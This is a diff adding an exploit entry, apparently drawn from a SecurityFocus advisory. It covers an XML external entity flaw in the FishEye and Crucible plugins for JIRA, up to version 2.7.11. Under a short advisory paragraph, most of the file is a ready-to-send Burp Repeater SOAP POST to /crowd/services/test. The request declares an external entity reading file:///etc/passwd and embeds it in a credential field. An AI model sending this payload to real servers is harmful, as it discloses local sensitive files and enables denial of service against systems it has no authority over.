@@ -1,0 +1,78 @@
+source: http://www.securityfocus.com/bid/53603/info
+
+The FishEye and Crucible plugins for JIRA are prone to an unspecified security vulnerability because they fail to properly handle crafted XML data.
+
+Exploiting this issue allows remote attackers to cause denial-of-service conditions or to disclose local sensitive files in the context of an affected application.
+
+FishEye and Crucible versions up to and including 2.7.11 are vulnerable. 
+
+Burp Repeater
+Host: somehost.com
+Port 443
+
+
+POST /crowd/services/test HTTP/1.1
+Accept-Encoding: gzip,deflate
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: ""
+User-Agent: Jakarta Commons-HttpClient/3.1
+Host: somehost.com
+Content-Length: 2420
+
+<!DOCTYPE foo [<!ENTITY xxec6079 SYSTEM "file:///etc/passwd"> ]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SecurityServer" xmlns:aut="http://authentication.integration.crowd.atlassian.com" xmlns:soap="http://soap.integration.crowd.atlassian.com">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <urn:addAllPrincipals>
+         <urn:in0>
+            <!--Optional:-->
+            <aut:name>?</aut:name>
+            <!--Optional:-->
+            <aut:token>?</aut:token>
+         </urn:in0>
+         <urn:in1>
+            <!--Zero or more repetitions:-->
+            <soap:
+SOAPPrincipalWithCredential>
+               <!--Optional:-->
+               <soap:passwordCredential>
+                  <!--Optional:-->
+                  <aut:credential>?</aut:credential>
+                  <!--Optional:-->
+                  <aut:encryptedCredential>?&xxec6079;</aut:encryptedCredential>
+               </soap:passwordCredential>
+               <!--Optional:-->
+               <soap:principal>
+                  <!--Optional:-->
+                  <soap:ID>?</soap:ID>
+                  <!--Optional:-->
+                  <soap:active>?</soap:active>
+                  <!--Optional:-->
+                  <soap:attributes>
+                     <!--Zero or more repetitions:-->
+                     <soap:SOAPAttribute>
+                        <!--Optional:-->
+                        <soap:name>?</soap:name>
+                        <!--Optional:-->
+                        <soap:values>
+                           <!--Zero or more repetitions:-->
+                           <urn:string>?</urn:string>
+                        </soap:values>
+                     </soap:SOAPAttribute>
+                  </soap:attributes>
+                  <!--Optional:-->
+                  <soap:conception>?</soap:conception>
+                  <!--Optional:-->
+                  <soap:description>?</soap:description>
+                  <!--Optional:-->
+                  <soap:directoryId>?</soap:directoryId>
+                  <!--Optional:-->
+                  <soap:lastModified>?</soap:lastModified>
+                  <!--Optional:-->
+                  <soap:name>?</soap:name>
+               </soap:principal>
+            </soap:SOAPPrincipalWithCredential>
+         </urn:in1>
+      </urn:addAllPrincipals>
+   </soapenv:Body>
+</soapenv:Envelope>
+
